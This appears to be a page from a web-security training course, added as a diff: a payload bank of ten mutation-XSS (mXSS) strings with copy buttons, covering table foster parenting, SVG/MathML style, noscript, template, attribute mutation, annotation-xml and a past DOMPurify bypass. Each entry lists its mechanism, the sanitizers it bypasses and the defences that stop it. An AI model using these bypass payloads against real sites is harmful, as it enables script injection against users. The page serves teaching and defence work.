@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Payload Bank 07 — Mutation XSS (mXSS)</title>
+<style>
+  :root{--bg:#0b0f1a;--panel:#141c2e;--border:#1e3a5f;--text:#e2e8f0;--muted:#7a9bbf;--accent:#38bdf8;--warn:#f5c842;--danger:#f87171;--ok:#4ade80;--orange:#fb923c;--purple:#a78bfa}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;padding:36px 32px;max-width:900px}
+  h1{font-size:22px;font-weight:800;color:var(--accent);margin-bottom:4px}
+  .sub{font-size:12px;color:var(--muted);margin-bottom:32px}
+  .entry{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:20px;margin-bottom:20px}
+  .entry-header{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px}
+  .entry-num{font-size:11px;font-weight:700;color:var(--muted);background:#060d1a;padding:3px 10px;border-radius:10px}
+  .tags{display:flex;flex-wrap:wrap;gap:5px}
+  .tag{font-size:10px;font-weight:700;padding:2px 8px;border-radius:10px}
+  .t-mxss{background:#1a002a;color:var(--purple)}
+  .t-bypass{background:#2a0000;color:var(--danger)}
+  .t-context{background:#001a1a;color:var(--ok)}
+  .payload-block{background:#060d1a;border:1px solid var(--border);border-radius:5px;padding:12px 14px;font-family:'Courier New',monospace;font-size:12px;color:var(--orange);margin:10px 0;position:relative;white-space:pre-wrap;word-break:break-all}
+  .copy-btn{position:absolute;top:8px;right:8px;font-size:10px;padding:3px 10px;background:#1e3a5f;color:var(--accent);border:1px solid var(--accent);border-radius:3px;cursor:pointer}
+  .meta{display:grid;grid-template-columns:auto 1fr;gap:4px 12px;font-size:12px;margin-top:10px}
+  .meta-key{color:var(--muted);font-weight:700;white-space:nowrap}
+  .meta-val{color:var(--text)}
+  .meta-val code{font-family:'Courier New',monospace;font-size:11px;background:#060d1a;color:var(--accent);padding:1px 5px;border-radius:3px}
+  .stopped{color:var(--ok)}
+  .bypasses{color:var(--danger)}
+  .nav{display:flex;gap:10px;margin-top:36px;padding-top:16px;border-top:1px solid var(--border)}
+  .nav a{font-size:12px;color:var(--accent);padding:7px 16px;border:1px solid var(--accent);border-radius:4px;text-decoration:none}
+  .section-label{font-size:13px;font-weight:700;color:var(--warn);margin:28px 0 10px;padding-bottom:4px;border-bottom:1px solid var(--border)}
+  a{color:var(--accent)}
+  .callout{border-left:3px solid var(--purple);background:#0d0015;padding:10px 14px;border-radius:0 4px 4px 0;font-size:12px;color:var(--muted);margin:12px 0}
+  .callout strong{color:var(--text)}
+</style>
+</head>
+<body>
+
+<h1>07 — Mutation XSS (mXSS)</h1>
+<div class="sub">10 payloads · Mechanism: Context-escape + reparse · Module reference: M13 · Lab: <code>http://localhost:5000/mxss/innerHTML?q=PAYLOAD</code></div>
+
+<div class="callout">
+  <strong>How mXSS works:</strong> A sanitizer parses the input string and judges it safe.
+  The sanitized string is then assigned to innerHTML. The browser re-parses it.
+  Due to parser state differences (namespace context, foster parenting, raw-text mode),
+  the second parse produces a different DOM — with an executable XSS payload.
+  The sanitizer was correct about what it parsed. The browser parsed differently.
+</div>
+
+<div class="section-label">A. Table Foster Parenting</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mxss">MXSS</span><span class="tag t-context">TABLE FOSTER</span></div>
+    <span class="entry-num">01</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;table&gt;&lt;td&gt;&lt;/td&gt;&lt;/table&gt;&lt;img src=x onerror=alert(1)&gt;
+&lt;!-- Or via foster parenting: --&gt;
+&lt;table&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/table&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">img tag injected inside table element — parser foster-parents it before the table</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">5 — Context escape: HTML5 parser ejects non-table content from table via foster parenting; ejected content is active HTML</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Sanitizers that check the string and see &lt;img&gt; inside &lt;table&gt; (apparently contained), but after re-parse img is in body</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">DOMPurify; Trusted Types; sanitizers that simulate the browser's full parse</span>
+    <span class="meta-key">Note</span><span class="meta-val">Foster parenting: when the HTML5 parser encounters non-table content inside a table, it "foster parents" it — moves it to just before the table element in the DOM. The content ends up in the document body as active HTML.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mxss">MXSS</span><span class="tag t-context">TABLE FOSTER</span><span class="tag t-bypass">SANITIZER BYPASS</span></div>
+    <span class="entry-num">02</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;table&gt;&lt;tbody&gt;&lt;/tbody&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/table&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">img after tbody but inside table — only specific table-structure elements are valid inside table</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">5 — Foster parenting ejects img before table; onerror fires in document body</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">String scanners; sanitizers that don't simulate table parsing rules</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">DOMPurify; CSP</span>
+    <span class="meta-key">Note</span><span class="meta-val">The only valid children of &lt;table&gt; are &lt;caption&gt;, &lt;colgroup&gt;, &lt;col&gt;, &lt;thead&gt;, &lt;tbody&gt;, &lt;tfoot&gt;, &lt;tr&gt;. Anything else is foster-parented. This is a defined part of the HTML5 parsing algorithm.</span>
+  </div>
+</div>
+
+<div class="section-label">B. SVG/Style Raw-Text Context</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mxss">MXSS</span><span class="tag t-context">SVG STYLE</span></div>
+    <span class="entry-num">03</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;svg&gt;&lt;style&gt;&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/svg&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">In SVG context: style is raw text; in HTML context after round-trip: style is CSS, img follows as HTML</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">5 — Re-parse changes context: sanitizer sees img inside SVG/style (text), browser after innerHTML sees img as HTML</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Sanitizers that serialize and re-check — the serialized form is the same; the re-parse is different</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">DOMPurify ≥ 2.0.17; Trusted Types; avoiding innerHTML round-trips</span>
+    <span class="meta-key">Note</span><span class="meta-val">Classic mXSS pattern (Cure53 research). In SVG parsing context, &lt;style&gt; is a raw-text element — its content is text. When the full string is serialized and re-parsed in HTML context, &lt;style&gt; becomes CSS and ends at &lt;/style&gt;, leaving the img as free HTML.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mxss">MXSS</span><span class="tag t-context">MATH STYLE</span></div>
+    <span class="entry-num">04</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;math&gt;&lt;style&gt;&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/math&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">Same as SVG/style but in MathML namespace</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">5 — MathML style element is raw text; re-parse in HTML context produces executable img</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Sanitizers handling SVG/style but not MathML/style</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">DOMPurify; blocking MathML style; CSP</span>
+    <span class="meta-key">Note</span><span class="meta-val">The MathML namespace also treats &lt;style&gt; as raw text. Same mutation mechanism as SVG/style. Different namespace — may evade sanitizers that handle one but not the other.</span>
+  </div>
+</div>
+
+<div class="section-label">C. &lt;noscript&gt; Scripting State</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mxss">MXSS</span><span class="tag t-context">NOSCRIPT</span></div>
+    <span class="entry-num">05</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;noscript&gt;&lt;p title="&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;"&gt;&lt;/noscript&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">&lt;noscript&gt; is parsed as HTML when scripting is OFF, as raw text when scripting is ON</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">5 — Parser state divergence: sanitizer runs with scripting OFF (sees this as HTML tree), browser with scripting ON (sees raw text) — or vice versa</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Sanitizers that run with scripting in a different state than the target browser</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">DOMPurify (removes noscript); Trusted Types; ensuring sanitizer and browser use same scripting state</span>
+    <span class="meta-key">Note</span><span class="meta-val">The HTML5 spec defines noscript parsing differently based on the "scripting flag". With scripting ON: noscript content is raw text (no child elements). With scripting OFF: noscript is parsed as HTML. A sanitizer built on a scraping engine with scripting OFF parses a different tree than a JS-enabled browser.</span>
+  </div>
+</div>
+
+<div class="section-label">D. &lt;template&gt; Inert Context</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mxss">MXSS</span><span class="tag t-context">TEMPLATE</span></div>
+    <span class="entry-num">06</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;template&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/template&gt;
+&lt;script&gt;
+  // Sanitizer sees template content as inert (no execution)
+  // But app code clones and appends the template:
+  const t = document.querySelector('template');
+  document.body.appendChild(t.content.cloneNode(true));
+  // NOW the img is live → onerror fires
+&lt;/script&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">Content inside &lt;template&gt; is inert — scripts and event handlers don't fire. But when template content is inserted into the live document, they activate.</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">5 — Inert-to-active transition: sanitizer checks template content in inert state; app code moves it to live document</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Sanitizers that check template content but don't account for the activate-on-clone step</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">DOMPurify; sanitising at the point of insertion, not at the point of template creation; Trusted Types</span>
+    <span class="meta-key">Note</span><span class="meta-val">The &lt;template&gt; element creates a DocumentFragment with a separate document. Scripts/handlers don't fire there. When you do cloneNode(true) and append to live document, the payload activates. The sanitize-then-template-then-insert pattern has this gap.</span>
+  </div>
+</div>
+
+<div class="section-label">E. Attribute Mutation</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mxss">MXSS</span><span class="tag t-context">ATTRIBUTE</span></div>
+    <span class="entry-num">07</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;!-- Input string (appears safe — style only): --&gt;
+&lt;p style="font-family:'foo()bar';"&gt;text&lt;/p&gt;
+
+&lt;!-- After innerHTML round-trip, some browsers produce: --&gt;
+&lt;p style="font-family:'foo()bar'"&gt;text&lt;/p&gt;
+&lt;!-- The mutation here: quotes and semicolons may shift, potentially opening
+     expression() injection in IE or other CSS-level payloads --&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">CSS style attribute mutation through innerHTML serialization and re-parsing</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">5 — CSS expression injection via mutation of style attribute quote handling</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Sanitizers that pass style attributes with valid-looking values that become invalid or executable after mutation</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Blocking style attributes entirely in sanitizer; CSS value allowlisting; CSP</span>
+    <span class="meta-key">Note</span><span class="meta-val">Style attribute mutation is browser-dependent. IE's <code>expression()</code> in CSS is the historic execution point. Modern browsers don't execute CSS expressions, but style mutation can still produce unexpected visual effects used in UI redressing attacks.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mxss">MXSS</span><span class="tag t-context">ATTRIBUTE CONTEXT</span></div>
+    <span class="entry-num">08</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;!-- Sanitizer sees this and passes it (img with safe alt): --&gt;
+&lt;img alt="&amp;lt;/img&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;"&gt;
+
+&lt;!-- innerHTML serialization produces: --&gt;
+&lt;img alt="&lt;/img&gt;&lt;img src=x onerror=alert(1)&gt;"&gt;
+&lt;!-- Re-parsed: alt value closing quote followed by dangling attribute = second img fires --&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML entity encoding inside alt attribute that becomes unencoded after innerHTML serialization</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">5 — Entity decoding on serialization + re-parse; the alt attribute "contains" HTML that leaks on re-parse</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Sanitizers that see escaped entities in attribute values as safe text</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">DOMPurify; serializers that re-encode entities on output</span>
+    <span class="meta-key">Note</span><span class="meta-val">innerHTML serialization may decode HTML entities that were safe in attribute context. When the serialized string is assigned to innerHTML again, the now-unencoded content is parsed as HTML. This is the mXSS definition: safe input → unsafe output after one serialize+reparse cycle.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mxss">MXSS</span><span class="tag t-context">ANNOTATION-XML</span></div>
+    <span class="entry-num">09</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;math&gt;&lt;annotation-xml encoding="text/html"&gt;
+  &lt;img src=x onerror=alert(1)&gt;
+&lt;/annotation-xml&gt;&lt;/math&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">MathML annotation-xml with HTML encoding — creates an HTML integration point inside MathML</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">5 — Namespace/integration point: sanitizer may model this as MathML text; browser parses content as HTML</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Sanitizers that don't implement HTML5 annotation-xml integration point semantics</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">DOMPurify; blocking annotation-xml; CSP</span>
+    <span class="meta-key">Note</span><span class="meta-val">HTML5 integration points: &lt;annotation-xml encoding="text/html"&gt; and &lt;annotation-xml encoding="application/xhtml+xml"&gt; switch the parser to HTML mode. Content inside is parsed as HTML — including event handlers. Sanitizers must implement this per the spec.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mxss">MXSS</span><span class="tag t-context">COMPLEX CHAIN</span></div>
+    <span class="entry-num">10</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;!-- Cure53 DOMPurify bypass (2019, fixed in 2.0.1): --&gt;
+&lt;math&gt;&lt;mtext&gt;&lt;/mtext&gt;&lt;/math&gt;&lt;img src=x onerror=alert(1)&gt;
+
+&lt;!-- More complex 2020 bypass attempt pattern: --&gt;
+&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;
+&lt;/style&gt;&lt;/mglyph&gt;&lt;/table&gt;&lt;/mtext&gt;&lt;/math&gt;
+&lt;img src=x onerror=alert(1)&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">MathML / table / mglyph / style element interaction creating parser confusion</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">5 — Multiple nested namespace boundaries with foster parenting; the state machine produces a different serialization than the original string</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">DOMPurify &lt; 2.0.1 (first pattern); complex patterns found by researchers probing namespace boundaries</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">DOMPurify ≥ 2.0.17; CSP; blocking MathML; Trusted Types</span>
+    <span class="meta-key">Origin</span><span class="meta-val">Research by Michał Bentkowski (Securitum), Masato Kinugawa, and others. mXSS bypasses are actively researched — even mature sanitizers like DOMPurify have had multiple mXSS bypasses. This is why version pinning + SRI on sanitizer scripts matters.</span>
+  </div>
+</div>
+
+<div class="nav">
+  <a href="06_filter_evasion.html">← 06: Filter Evasion</a>
+  <a href="../payload_bank.html">Index</a>
+  <a href="08_chaining_payloads.html">08: Chaining →</a>
+</div>
+
+<script>
+document.querySelectorAll('.copy-btn').forEach(btn => {
+  btn.addEventListener('click', () => { btn.textContent = 'copied!'; setTimeout(() => btn.textContent = 'copy', 1500); });
+});
+</script>
+</body>
+</html>
